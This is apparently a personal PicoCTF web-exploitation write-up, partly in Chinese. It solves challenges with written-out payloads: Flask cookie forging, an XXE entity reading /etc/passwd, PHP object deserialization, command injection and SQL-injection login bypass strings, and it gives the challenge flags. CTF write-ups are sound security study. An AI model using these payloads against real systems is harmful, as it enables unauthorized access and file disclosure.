---
title: ctfs-web-1
date: 2024-05-09 12:30:09
tags: CTFs
categories: CTFs
description: PicoCTF web writeUp !
---

Web Exploitation
==

Most cookie *
--

`flask cookie`

+ `app.secret_key`

+ server.py: 
```python=
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()

```

+ get session
+ check cookie
+ `Set-Cookie`: session=eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZazO0w.3CsATe1Bk_b1VNx3hbGCG0nEew4
+ `decode` : very_auth with `cookies_names` -> session = {"very_auth","admin"}

---
#### Tools
`flask-unsign`

#### Sol
+ get session value`eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZazZAw.YdHCNcSIYY20b4_c_kpOSnAylWQ`
+ basse64 decode ,get `{"very_auth":"blank"}e#\HF)V`
+ So we need to change it to `{"very_auth":"blank"}` and use `cookie_names (secret_key)` to encode

##### Terminal
```bash=
$pip install flask-unsign
$pip install flask-unsign-wordlist
# echo cookie_names > wordlist.txt
$flask-unsign --unsign --cookie eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZazdjA.HuEoSxDF2RZZEhmP1f52Rh0ERVs --wordlist Most_cookies_pico/wordlist.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'gingersnap'

flask-unsign --sign --cookie "{'very_auth' : 'admin'}" --secret gingersnap
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zaze8A.392G1bXJFm6Ubl3Eal7A-nrX0OA
```

+ Set session = `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Zaze8A.392G1bXJFm6Ubl3Eal7A-nrX0OA`

`Flag` : picoCTF{pwn_4ll_th3_cook1E5_5f016958}

`REF` : 
[flask hacketricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask)
[CTF time](https://ctftime.org/writeup/26978)
[Termal SOL REF](https://medium.com/@MohammedAl-Rasheed/picoctf-2021-most-cookies-7f3d8b6cd0b)

SOAP
--
`XML injection`
`XXE`

+ data: POST request
+ ![image](https://hackmd.io/_uploads/HJxAa25Ya.png)

+ `xmlDetailsCheckPayload.js`
```javascript=
window.contentType = 'application/xml';

function payload(data) {
    var xml = '<?xml version="1.0" encoding="UTF-8"?>';
    xml += '<data>';

    for(var pair of data.entries()) {
        var key = pair[0];
        var value = pair[1];

        xml += '<' + key + '>' + value + '</' + key + '>';
    }

    xml += '</data>';
    return xml;
}
```
+ Header + code

```xml=
POST /data HTTP/1.1
Host: saturn.picoctf.net:49309
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36
Accept: */*
Referer: http://saturn.picoctf.net:49309/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Length: 135

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file://etc/passwd">
]>
<data><ID>&file;</ID></data>

```

+ Inject code
```xml=
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY file SYSTEM “file:///etc/passwd” >
]>
<data>
    <ID>
        &file;
    </ID>
</data>

```

+ `<!DOCTYPE data [<!ENTITY file SYSTEM “file:///etc/passwd” >]>` : 定義了一個名為 "file" 的實體，其內容是 /etc/passwd 文件的內容。
+ `<data><ID>&file;</ID></data>` : 引用file實體，將其插入到XML文檔的相應部分。


`Flag` : picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}
`REF` : https://github.com/DanArmor/picoCTF-2023-writeup/blob/main/Web%20Exploitation/SOAP/SOAP.md
https://hackmd.io/@5hErry/HJUMum0kh


caas 
--
`command injection`

+ `index.js`
```javascript=
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
    // it exec the message
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});
```

![image](https://hackmd.io/_uploads/BJETYwctp.png)

![image](https://hackmd.io/_uploads/Sy1M5P5Kp.png)


`Flag` : picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}


Super Serial
--

+ `index.phps`
```php=
?php
require_once("cookie.php"); //cookie.phps

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php"); //authentication.phps
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```
+ 發現登入建立了一個permissions對象，該對像被序列化，然後放入該login對像中。您還可以看到還有 2 個可以使用 phps 擴展名讀取的 php 文件，cookie.phps以及authentication.phps.

+ `cookie.phps`
```php=
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```
+ 只需將 cookie 編輯為序列化、base64 和 URL 編碼的 access_log，指向 ../flag 並請求主頁。錯誤訊息包含 flag

+ `authentication.phps`
```php=
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```

+ 在authentication.phps中有一個access_log類別

+ access_log 物件帶上 `../flag` 的序列化
```php=
<?php
class access_log
{
    public $log_file;

    function __construct($lf)
    {
        $this->log_file = $lf;
    }

    function __toString()
    {
        return $this->read_log();
    }

    function append_to_log($data)
    {
        file_put_contents($this->log_file, $data, FILE_APPEND);
    }

    function read_log()
    {
        return file_get_contents($this->log_file);
    }
}

// 創建 access_log 物件
$accessLog = new access_log("../flag");

// 序列化 access_log 物件
$serializedData = serialize($accessLog);

// 輸出序列化後的資料
echo $serializedData;
?>

```
`O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}`


+ base64 encode serialization,and set to cookie `{'login':'TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9'}`

+ 然後server就掛了
![image](https://hackmd.io/_uploads/BJLIuhjt6.png)

+ `<url>/authentication.php` , set cookie 就有了

`Flag` : picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}
`REF` : https://ctftime.org/writeup/27162



Web Gauntlet
--
`SQL injection`

### Round1
+ Round1: or
```input=
user = admin'--
password = <123>
```

### Round2
+ Round2: or and like=--
```input=
user= admin' /*
password=123
```

### Round3
+ Round3: or and = like > < --
```input=
user= admin';
password=123
```

### Round4
+ Round4: or and = like > < -- admin

+ use ||
```input=
user= ad'||'min';
password=123
```
+ sql
```sql
SELECT * FROM users WHERE username='ad'||'min';' AND password='ads'
```
+ use union
```input
user = 123'/**/union/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;
```
+ sql
```sql
SELECT * FROM users WHERE username='mregra'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1; AND   password='pass'
```
### Round5
+ Round5: or and = like > < -- union admin
+ union:

```input=
user= ad'||'min';
password=123
```

`Flag` : picoCTF{y0u_m4d3_1t_275cea1159781d5b3ef3f57e70be664a}
`REF` : https://mregraoncyber.com/picoctf-writeup-web-gauntlet/


Web Gauntlet 2
--

### Round1

+ Filters: or and true false union like = > < ; -- /* */ admin

Some Assembly Required 1
--
+ in `wasm` direction

`Flag` : picoCTF{cb688c00b5a2ede7eaedcae883735759}

Some Assembly Required 2
--

Who are you?
--

+ Only people who use the official PicoBrowser are allowed on this site!

```txt=
user-agent:PicoBrowser
Referer:mercury.picoctf.net:34588
Date:2018
DNT:1
X-forwarded-for:102.177.146.1 #指定 Sweden ip
Accept-Language:SV # SV: Swedish
```
`Flag`: picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_79e451a7}

Simple
--

### GET aHEAD

`
$curl -I -H "Host: HEAD" http://mercury.picoctf.net:28916/index.php
`
+ HOST 改成什麼都可以
+ `-i` : get header and body
+ `-I` : Just get header

![image](https://hackmd.io/_uploads/BJtWxuYYp.png)


`flag` : picoCTF{r3j3ct_th3_du4l1ty_70bc61c4}
`REF` : https://ctftime.org/writeup/27020


### logon

1. submit 
2. set cookie `admin , False` to `True`

`Flag` : picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}

### dont-use-client-side

```htmlembedded
<script type="text/javascript">
  function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == 'e2f2') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_e') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == '4}') {
                  alert("Password Verified")
                  }
                }
              }
      
            }
          }
        }
      }
    }
    else {
      alert("Incorrect password");
    }
    
  }
</script>

```


### Inspector

+ Flag is in the file.

### Client-side-again

```javascript
var _0x5a46 = ['37115}', '_again_3', 'this', 'Password\x20Verified', 'Incorrect\x20password', 'getElementById', 'value', 'substring', 'picoCTF{', 'not_this'];
(function(_0x4bd822, _0x2bd6f7) {
    var _0xb4bdb3 = function(_0x1d68f6) {
        while (--_0x1d68f6) {
            _0x4bd822['push'](_0x4bd822['shift']());
        }
    };
    _0xb4bdb3(++_0x2bd6f7);
}(_0x5a46, 0x1b3));
var _0x4b5b = function(_0x2d8f05, _0x4b81bb) {
    _0x2d8f05 = _0x2d8f05 - 0x0;
    var _0x4d74cb = _0x5a46[_0x2d8f05];
    return _0x4d74cb;
};

function verify() {
    checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];
    split = 0x4;
    if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3')) {
        if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n') {
            if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4')) {
                if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT') {
                    if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5')) {
                        if (checkpass['substring'](0x6, 0xb) == 'F{not') {
                            if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6')) {
                                if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7')) {
                                    alert(_0x4b5b('0x8'));
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        alert(_0x4b5b('0x9'));
    }
}
```
+ `_0x5a46` 

`Flag` : picoCTF{not_this_again_337115}

`REF` : https://ctftime.org/writeup/19131
